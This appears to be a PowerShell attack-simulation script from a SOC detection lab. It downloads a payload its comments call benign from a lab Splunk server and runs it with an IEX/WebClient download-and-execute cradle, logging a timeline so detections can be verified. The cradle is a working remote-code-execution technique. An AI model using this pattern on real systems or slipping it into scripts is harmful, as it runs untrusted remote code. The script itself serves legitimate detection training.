# 04-attacks / Attk103_psuedoattacks.ps1
# Attk103 - PowerShell download-and-execute
# Downloads a BENIGN payload served by Splunk Web and executes it, with full
# timestamped logging. Demonstrates the download-and-execute pattern a SOC must
# detect, without any real malware.
#
# Run on the Windows VM after deploying the Splunk app static payload.
$ErrorActionPreference = 'Stop'

$SplunkHost = if ($env:SPLUNK_HOST_IP) { $env:SPLUNK_HOST_IP } else { Read-Host 'Mac/Splunk IP reachable from this VM' }
$parsedSplunkHost = $null
if (-not [System.Net.IPAddress]::TryParse($SplunkHost, [ref]$parsedSplunkHost)) {
    throw "SPLUNK_HOST_IP must be a valid IP address, received: $SplunkHost"
}
$PayloadUrl = if ($env:CAPSTONE_PAYLOAD_URL) { $env:CAPSTONE_PAYLOAD_URL } else { "http://$SplunkHost`:8000/en-US/static/app/soc_capstone_detections/soc_benign_payload.ps1" }
$LogFile = Join-Path $PSScriptRoot 'attk103_timeline.log'

function Log($m) {
    $line = "$(Get-Date -Format o) | $m"
    Write-Host $line -ForegroundColor Cyan
    Add-Content -Path $LogFile -Value $line
}

Log "[Attk103] PowerShell download and execute | target=$env:COMPUTERNAME"
Log "[Attk103] Payload URL: $PayloadUrl (benign, lab only)"

# Download-and-execute. The payload just echoes a marker so execution success
# is visible in the timeline and in the Sysmon process-create event.
Log "[Attk103] Executing cradle: IEX (New-Object Net.WebClient).DownloadString(...)"
try {
    $output = IEX (New-Object System.Net.WebClient).DownloadString($PayloadUrl)
    Log "[Attk103] RESULT: payload executed. Output: $output"
} catch {
    Log "[Attk103] ERROR: $($_.Exception.Message)"
}

Log "[Attk103] END | timeline -> $LogFile"
